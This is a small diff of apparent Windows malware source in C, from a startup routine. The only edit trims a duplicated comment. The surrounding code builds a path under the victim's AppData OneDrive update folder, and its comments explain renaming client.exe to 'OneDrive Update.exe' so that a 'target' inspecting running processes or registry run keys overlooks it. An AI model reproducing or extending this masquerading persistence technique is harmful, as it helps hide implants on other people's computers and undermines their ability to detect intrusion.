@@ -39,7 +39,7 @@ int startup()
     SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, new);
     strcat(new, "\\Microsoft\\OneDrive\\Update\\OneDrive Update.exe");
 
-    // gets the target's local appdata path and then appends the one drive update directory to it. from what i know, all windows computers 10 and 11
+    // gets the target's local appdata path and then appends the one drive update directory to it.
     // from what i know all windows computers 10 and 11 install one drive by default so it should always be here. 
     // renames the file from client.exe to OneDrive Update.exe to attempt to get ignored if the target looks at running processes / registry run keys
 
